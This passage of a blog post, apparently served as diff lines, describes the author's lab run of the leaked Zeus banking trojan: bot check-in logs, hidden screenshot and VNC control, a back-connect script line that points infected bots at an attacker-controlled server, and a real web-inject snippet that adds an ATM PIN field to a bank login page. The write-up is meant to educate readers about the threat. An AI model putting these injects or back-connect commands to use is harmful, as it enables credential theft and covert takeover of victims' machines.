+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:11:00:25 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:11:00:30 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:11:00:35 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:11:00:40 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:11:00:45 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:11:00:50 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:11:00:56 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:11:01:01 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:11:01:07 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:11:01:40 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:11:01:45 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:11:01:50 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+172.16.50.2 - - <span style="color:#ff79c6">[</span>19/Sep/2013:11:01:55 -0400<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;POST /z/gate.php HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> - <span style="color:#f1fa8c">&#34;-&#34;</span> <span style="color:#f1fa8c">&#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&#34;</span>
+</code></pre></div><p>We are also able to, using the control panel, see some more information based on the newly connected bot:</p>
+<figure>
+    <img src="https://leonjza.github.io/images/zues_bot_zombie.png"/> 
+</figure>
+
+<p>An interesting thing to note here. It appears that the Zeus bot opens up a socks port on the client machines. If the Command &amp; Control server is able to connect to this IP, and the socks port, then it will be able to pull a screenshot of the current state the client pc is in. This is an <em>almost live</em> image. On the client, we can see that the process <code>explorer.exe</code> is listening in port 35419. This is the same port that the web interface is reporting as the SOCKS port.</p>
+<figure>
+    <img src="https://leonjza.github.io/images/zues_bot_listener_port.png"/> 
+</figure>
+
+<p>In the case of my lab setup, this SOCKS connection was not possible due to the fact that the client is reporting as connected from 172.16.50.2, which is the fake, natted public ip of the lab firewall. The firewall itself is most certainly not listening on that port so the connection would fail. Maybe if I port forwarded the connection back into the fake LAN it would have been able to connect but this I did not test.</p>
+<p>So, to test the screen-shotting features, I infected another client on the fake Internet, where the Command &amp; Control server <strong>will</strong> be able to connect to. The result?</p>
+<figure>
+    <img src="https://leonjza.github.io/images/zues_bot_screenshot.png"/> 
+</figure>
+
+<p>There is <strong>no</strong> visual sign of this activity to the user. The user may be busy with some highly confidential work on hes workstation, unaware that an intruder is able to see what he is seeing. You know, like using that secret text file with all your passwords in it.</p>
+<h4 id="but-thats-not-all">But thats not all</h4>
+<p>Just being able to <em>see</em> what the user sees is not really enough. No. You also have the ability to remotely VNC into the infected machine. By doing this, the attacker is able to remotely control your computer as you, with one difference, you won&rsquo;t know about it. So lets say he managed to successfully compromise your banking credentials. Instead of triggering alarms on the banks side that a login has just occurred on the other side of the globe, the attacker can now use <strong>your</strong> machine to steal <strong>your</strong> money. From the banks perspective this may appear like a perfectly legitimate transaction.</p>
+<p>So lets see how this VNC functionality works.</p>
+<h4 id="execute-the-vnc-bc-script">Execute the VNC BC Script</h4>
+<p>First, the attacker will have to prepare a back connect server and then, via a script, tell the bot to connect to this server so that he may access the botted machine. This architecture is pretty solid. The only thing really that would stop an attacker from succeeding in setting up this back connect is if the remote firewall was to block the port that the attacker has set up on the back connect server. However, things like port 80, or even 443 is almost always opened, so these will be prime candidates to use.</p>
+<p>In short, the setup will look something like this.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">   --------------------------&gt;        &lt;--------------------------------------------
+   --------------------------&gt;        &lt;--------------------------------------------
+
+   +------------+      +-----------------------+  +--------------+   +------------------+
+   |  Attacker  +------&gt;  Back Connect Server  &lt;--+ LAN Firewall &lt;---+ Infected Machine |
+   +------------+      +-----------------------+  +--------------+   +------------------+
+</code></pre></div><p>The back connect server could be any host the attacker has access to and controls. This is also a great way for the attacker that wants to VNC to hide hes IP information. Should you on the infected machine realize what is going on, then you&rsquo;d only see the connection going out to the back connect server, and not the real attacker. The server executable is <code>zsbcs.exe</code> in the <code>output/server/</code> directory and is a windows only tool.</p>
+<p>Once the Back Connect Server is setup to listen on one port for new bots, and another for VNC client connections, the attacker would configure a script, instructing the clients where to connect. The script would look something like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bot_bc_add vnc 172.16.50.181 <span style="color:#bd93f9">9000</span>
+</code></pre></div><p>This tells the bot where to connect to wait for a VNC session.</p>
+<p>Next, the attacker can sit and watch hes Back Connect Server&rsquo;s output and see when a new bot has connected. He may now connect using hes VNC client to the client port of the back connect server and viola, VNC access. Alarmingly, the VNC access is not like your traditional VNC where the user will see the pointer move as the VNC user moves it. No, this VNC session starts in a separate <strong>display</strong>, ensuring that the user is still unaware of what is happening. This for me was the most alarming part. It&rsquo;s almost as if hes attaching to another <em>tty</em>.</p>
+<figure>
+    <img src="https://leonjza.github.io/images/zues_back_connect_vnc.png"/> 
+</figure>
+
+<h3 id="web-injects-the-real-threat">Web Injects, the real threat.</h3>
+<p>So all of this Remote Administration Stuff is cool. No doubt they are useful tools for an attacker, but this is not what has made Zeus what it is known for today. Zeus uses what is called <strong>Web Injects</strong> to manipulate website content. &ldquo;What do you mean by &lsquo;manipulation&rsquo;?&rdquo; you may ask. Well, lets assume you are about to buy something online. Generally, the store would ask you for a Credit Card number and an expiry. Usually, on the next page you may be asked for the CVV number. With your machine infected with Zeus, the attacker is able to ask for your Credit Card Number, Expiry, CVV, Email Address, Address, Tel no., secret question etc etc all on one page. The page itself will look totally legit, and again, to the unsuspecting user, this may seem completely normal and away he goes entering hes details. Once submitted, Zeus captures the entire request, including the cookies, the POST data etc etc and based on the bots timer configurations, uploads this information to the Command &amp; Control server. Just like the one we just used to Remotely Administer the infected machines.</p>
+<p>With all this information, he may be able to return at a later stage, VNC to your computer and access your account to buy himself some new toys. Because he managed to get hold of your secret question, he finds no trouble in complying to any potential security checks the portal may bring.</p>
+<h4 id="how-it-works">How it works</h4>
+<p>When looking at the web injects, I guess the simplest way to describe them is similar to your favorite text editors search and replace features. With the Zeus bot hooked into some low level network API&rsquo;s in Windows, it is able to monitor for its configured URL&rsquo;s, and inject arbitrary content into the responses that are displayed in your browser. Lets take an example from the source <a href="https://github.com/Visgean/Zeus/blob/translation/output/builder/webinjects.txt#L63">here</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">set_url https://www.wellsfargo.com/* G
+data_before
+&lt;<span style="color:#ff79c6">span</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;mozcloak&#34;</span>&gt;&lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span>*&lt;/<span style="color:#50fa7b">span</span>&gt;
+data_end
+data_inject
+&lt;<span style="color:#ff79c6">br</span>&gt;&lt;<span style="color:#ff79c6">strong</span>&gt;&lt;<span style="color:#ff79c6">label</span> <span style="color:#50fa7b">for</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;atmpin&#34;</span>&gt;ATM PIN&lt;/<span style="color:#ff79c6">label</span>&gt;:&lt;/<span style="color:#ff79c6">strong</span>&gt;&amp;nbsp;&lt;<span style="color:#ff79c6">br</span> /&gt;
+&lt;<span style="color:#ff79c6">span</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;mozcloak&#34;</span>&gt;&lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;password&#34;</span> <span style="color:#50fa7b">accesskey</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;A&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;atmpin&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;USpass&#34;</span> <span style="color:#50fa7b">size</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;13&#34;</span> <span style="color:#50fa7b">maxlength</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;14&#34;</span> <span style="color:#50fa7b">style</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width:147px&#34;</span> <span style="color:#50fa7b">tabindex</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;2&#34;</span> /&gt;&lt;/<span style="color:#ff79c6">span</span>&gt;
+data_end
+data_after
+data_end
+</code></pre></div><p>In the above extract from the web injects we can see that the http<strong>s</strong>://wellsfargo.com (note the s) website will have a extra field added, asking for a <em>ATM PIN</em> before the password field. Now, an important thing to note here. Yes, a website owner could change the web sources which will make this web inject not work, however, the POST data will still be recorded for this watched URL and eventually stored on the C&amp;C.</p>
+<figure>
+    <img src="https://leonjza.github.io/images/zues_web_inject_examples.png"/> 
+</figure>
+
+<h3 id="summary">Summary</h3>
+<p>While Zeus itself is old news and many variants such as <a href="http://www.mcafee.com/us/resources/white-papers/wp-citadel-trojan.pdf">Citadel</a> have sprung up, I believe this is still a very valid threat as the concepts remain the same.</p>
+<p>A interesting thing about the bot. Zeus, once it infects a PC, will delete all the cookies in Internet Explorer. This is to force the user to re-login to the services he uses, and also lets Zeus grab them :)</p>
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+  
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+          <script type="text/javascript">
+          
+          (function() {
+              
+              
+              
+              
+          
+              var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+              var disqus_shortname = 'slashnote';
+              dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+              (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+          })();
+          </script>
+          <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+          <a href="https://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        </div>
+    </div>
+
+  
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://leonjza.github.io/">Home</a></li>
+         
+          <li><a href="https://leonjza.github.io/about/">About Me</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#bots-for-the-masses">Bots for the masses.</a></li>
+        <li><a href="#so-botnet">So, botnet?</a></li>
+        <li><a href="#the-zeus-bot-architecture">The Zeus Bot Architecture</a></li>
+        <li><a href="#zeus-source-leaked">Zeus Source Leaked</a></li>
+        <li><a href="#lab-time">LAB Time!</a></li>
+        <li><a href="#the-configuration">The Configuration</a>
+          <ul>
+            <li><a href="#command--control">Command &amp; Control</a></li>
+            <li><a href="#installing-the-command--control">Installing the Command &amp; Control</a></li>
+            <li><a href="#compiling-the-bot">Compiling the Bot</a></li>
+          </ul>
+        </li>
+        <li><a href="#skipping-the-creative-parts---infection">Skipping the creative parts - Infection.</a></li>
+        <li><a href="#from-the-bot-herders-perspective">From the Bot Herders Perspective</a>
+          <ul>
+            <li><a href="#but-thats-not-all">But thats not all</a></li>
+            <li><a href="#execute-the-vnc-bc-script">Execute the VNC BC Script</a></li>
+          </ul>
+        </li>
+        <li><a href="#web-injects-the-real-threat">Web Injects, the real threat.</a>
+          <ul>
+            <li><a href="#how-it-works">How it works</a></li>
+          </ul>
+        </li>
+        <li><a href="#summary">Summary</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f&text=Zeus%20My%20Adventure%20with%20a%20Infamous%20Bot">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f&title=Zeus%20My%20Adventure%20with%20a%20Infamous%20Bot">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f&is_video=false&description=Zeus%20My%20Adventure%20with%20a%20Infamous%20Bot">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Zeus%20My%20Adventure%20with%20a%20Infamous%20Bot&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f&title=Zeus%20My%20Adventure%20with%20a%20Infamous%20Bot">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f&title=Zeus%20My%20Adventure%20with%20a%20Infamous%20Bot">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f&title=Zeus%20My%20Adventure%20with%20a%20Infamous%20Bot">
+      <i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f&title=Zeus%20My%20Adventure%20with%20a%20Infamous%20Bot">
+      <i class="fab fa-digg fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f&name=Zeus%20My%20Adventure%20with%20a%20Infamous%20Bot&description=%3cp%3e%3cstrong%3eNOTE%21%20THIS%20IS%20FOR%20EDUCATIONAL%20PURPOSES%20ONLY.%20CHANCES%20ARE%2c%20IF%20YOU%20TRY%20THIS%20WITHOUT%20PERMISSION%2c%20YOU%20WILL%20GET%20CAUGHT%20AND%20GET%20THROWN%20INTO%20A%20DARK%20PLACE%20WITH%20NO%20INTERNET%3c%2fstrong%3e%3c%2fp%3e%0a%3ch3%20id%3d%22bots-for-the-masses%22%3eBots%20for%20the%20masses.%3c%2fh3%3e%0a%3cp%3eRecently%20at%20a%20conference%20that%20I%20attended%2c%20I%20sat%20in%20a%20class%20that%20was%20talking%20about%20Botnets%20and%20general%20%26lsquo%3bHow%20Easy%20They%20Are%26rsquo%3b%20related%20things.%2090%25%20of%20the%20technical%20discussions%20did%20not%20really%20come%20as%20a%20surprise%20to%20me%2c%20however%2c%20I%20came%20to%20realize%20that%20I%20am%20not%20%3cstrong%3e100%25%3c%2fstrong%3e%20aware%20of%20how%20%28%20and%20I%20dare%20say%20this%20lightly%20%29%20%3cem%3eeasy%3c%2fem%3e%20they%20have%20it.%20The%20technical%20competency%20of%20the%20adversary%20really%20doesn%26rsquo%3bt%20have%20to%20be%20at%20a%20jaw%20droppingly%20high%20level.%20In%20fact%2c%20if%20you%20can%20operate%20the%20keyboard%20and%20mouse%2c%20heck%2c%20even%20a%20tablet%2fphone%20once%20its%20all%20setup%2c%20then%20you%20could%20potentially%20be%20a%20successful%20botnet%20operator.%3c%2fp%3e">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fposts%2f2013-09-23-zeus-my-adventure-with-a-infamous-bot%2f&t=Zeus%20My%20Adventure%20with%20a%20Infamous%20Bot">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2020  Leon Jacobs 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="https://leonjza.github.io/">Home</a></li>
+         
+        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=https://leonjza.github.io/lib/font-awesome/css/all.min.css>
+<script src=https://leonjza.github.io/lib/jquery/jquery.min.js></script>
+<script src=https://leonjza.github.io/js/main.js></script>
+
+
+
+</html>
